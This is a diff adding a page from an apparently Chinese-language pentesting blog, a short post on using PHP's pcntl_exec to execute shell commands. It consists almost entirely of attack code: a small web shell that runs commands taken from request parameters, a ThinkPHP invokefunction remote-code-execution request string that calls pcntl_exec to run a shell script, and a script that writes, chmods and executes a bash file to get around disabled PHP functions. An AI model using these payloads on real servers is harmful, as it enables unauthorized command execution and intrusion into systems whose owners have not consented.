@@ -1,0 +1,102 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+        <meta charset="utf-8" />
+        <title>pcntl_exec</title>
+        <link rel="stylesheet" href="/theme/css/main.css" />
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <h1><a href="/">Follow Your Heart </a></h1>
+                <nav><ul>
+                    <li><a href="/category/pentest.html">Pentest</a></li>
+                    <li><a href="/category/learning.html">Learning</a></li>
+                    <li><a href="/category/python.html">Python</a></li>
+                    <li><a href="/pages/tips.html">Tips</a></li>
+                    <li><a href="/pages/bash.html">Bash</a></li>
+                    <li><a href="/pages/question.html">Question</a></li>
+                    <li><a href="/pages/reverse-shell.html">各种姿势的反弹shell</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+<section id="content" class="body">
+  <article>
+    <header>
+      <h1 class="entry-title">
+        <a href="/pcntl_exec.html" rel="bookmark"
+           title="Permalink to pcntl_exec">pcntl_exec</a></h1>
+    </header>
+<footer class="post-info">
+        <span class="published" title="2018-12-18T00:00:00+01:00">
+                <a href='#'>12/18/2018 </a>
+                <a href="/category/misc.html">misc</a>
+        </span>
+
+
+
+</footer><!-- /.post-info -->
+    <div class="entry-content">
+      
+      <div class="highlight"><pre><span></span><span class="err">参数执行</span><span class="o">:</span>
+<span class="n">pcntl_exec</span><span class="o">(</span><span class="s2">&quot;/bin/bash&quot;</span><span class="o">,</span><span class="n">array</span><span class="o">(</span><span class="s2">&quot;-c&quot;</span><span class="o">,</span><span class="s2">&quot;id &gt; 1.txt&quot;</span><span class="o">))</span> <span class="c1">//返回值可能是502</span>
+
+<span class="err">执行脚本</span><span class="o">:</span>
+<span class="n">pcntl_exec</span><span class="o">(</span><span class="s2">&quot;/tmp/script&quot;</span><span class="o">)</span>   <span class="c1">//返回值502</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span>返回值<span class="mi">200</span>
+<span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="mh">$c</span><span class="nv">md</span> <span class="o">=</span> $<span class="nv">_REQUEST</span>[<span class="s1">&#39;</span><span class="s">cmd</span><span class="s1">&#39;</span>]<span class="c1">;</span>
+<span class="k">if</span><span class="ss">(</span><span class="nv">function_exists</span><span class="ss">(</span><span class="s1">&#39;</span><span class="s">pcntl_exec</span><span class="s1">&#39;</span><span class="ss">))</span> {
+    <span class="nv">switch</span><span class="ss">(</span><span class="nv">pcntl_fork</span><span class="ss">())</span>{
+     <span class="nv">case</span> <span class="mi">0</span>:
+        <span class="nv">pcntl_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span>[<span class="mi">0</span>], <span class="mh">$c</span><span class="nv">md</span>[<span class="mi">1</span>]<span class="ss">)</span><span class="c1">;</span>
+    <span class="nv">default</span>:
+          <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">case 111</span><span class="s2">&quot;</span><span class="c1">;</span>
+    }
+} <span class="k">else</span> {
+        <span class="nv">echo</span> <span class="s1">&#39;</span><span class="s">不支持pcntl扩展</span><span class="s1">&#39;</span><span class="c1">;</span>
+}
+?<span class="o">&gt;</span>
+
+
+<span class="nv">cmd</span>[<span class="mi">0</span>]<span class="o">=/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">bash</span><span class="o">&amp;</span><span class="nv">cmd</span>[<span class="mi">1</span>][<span class="mi">0</span>]<span class="o">=-</span><span class="nv">c</span><span class="o">&amp;</span><span class="nv">cmd</span>[<span class="mi">1</span>][<span class="mi">1</span>]<span class="o">=</span><span class="nv">id</span> <span class="o">&gt;</span> <span class="o">/</span><span class="nv">tmp</span><span class="o">/</span><span class="nv">xxx</span>.<span class="nv">txt</span>
+<span class="o">/</span><span class="nv">index</span>.<span class="nv">php</span>?<span class="nv">s</span><span class="o">=/</span><span class="nv">index</span><span class="o">/</span>\<span class="nv">think</span>\<span class="nv">app</span><span class="o">/</span><span class="nv">invokefunction</span><span class="o">&amp;</span><span class="nv">function</span><span class="o">=</span><span class="nv">call_user_func_array</span><span class="o">&amp;</span><span class="nv">vars</span>[<span class="mi">0</span>]<span class="o">=</span><span class="nv">pcntl_exec</span><span class="o">&amp;</span><span class="nv">vars</span>[<span class="mi">1</span>][<span class="mi">0</span>]<span class="o">=/</span><span class="nv">bin</span><span class="o">/</span><span class="nv">bash</span><span class="o">&amp;</span><span class="nv">vars</span>[<span class="mi">1</span>][<span class="mi">1</span>][<span class="mi">0</span>]<span class="o">=/</span><span class="nv">tmp</span><span class="o">/</span><span class="mi">1</span>.<span class="nv">sh</span>
+</pre></div>
+
+
+<div class="highlight"><pre><span></span><span class="o">&lt;</span>?<span class="nv">php</span>
+<span class="nv">header</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">Content-Type: text/plain</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+<span class="mh">$c</span><span class="nv">md</span><span class="o">=</span><span class="s2">&quot;</span><span class="s">/tmp/exec</span><span class="s2">&quot;</span><span class="c1">;</span>
+@<span class="k">unlink</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span><span class="ss">)</span><span class="c1">;</span>
+@<span class="k">unlink</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">/tmp/output</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+<span class="mh">$c</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="s">#!/usr/bin/env bash</span><span class="se">\n</span><span class="s">uname -a &gt; /tmp/output</span><span class="se">\n</span><span class="s2">&quot;</span><span class="c1">;</span>
+<span class="nv">file_put_contents</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span>, <span class="mh">$c</span><span class="ss">)</span><span class="c1">;</span>
+<span class="nv">chmod</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span>, <span class="mi">0777</span><span class="ss">)</span><span class="c1">;</span>
+
+<span class="nv">switch</span> <span class="ss">(</span><span class="nv">pcntl_fork</span><span class="ss">())</span> {
+  <span class="nv">case</span> <span class="mi">0</span>:
+    $<span class="nv">ret</span> <span class="o">=</span> <span class="nv">pcntl_exec</span><span class="ss">(</span><span class="mh">$c</span><span class="nv">md</span><span class="ss">)</span><span class="c1">;</span>
+    <span class="k">exit</span><span class="ss">(</span><span class="s2">&quot;</span><span class="s">case 0</span><span class="s2">&quot;</span><span class="ss">)</span><span class="c1">;</span>
+  <span class="nv">default</span>:
+    <span class="nv">echo</span> <span class="s2">&quot;</span><span class="s">case 1</span><span class="s2">&quot;</span><span class="c1">;</span>
+    <span class="k">break</span><span class="c1">;</span>
+}
+</pre></div>
+
+
+<p>上面执行的脚本那行chmod不可以少</p>
+<ul>
+<li>https://bugs.leavesongs.com/%E8%BF%90%E7%BB%B4%E5%AE%89%E5%85%A8/lnmp%E8%99%9A%E6%8B%9F%E4%B8%BB%E6%9C%BAphp%E6%B2%99%E7%9B%92%E7%BB%95%E8%BF%87-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</li>
+</ul>
+    </div><!-- /.entry-content -->
+
+  </article>
+</section>
+        <section id="extras" class="body">
+        </section><!-- /#extras -->
+
+
+</body>
+</html>
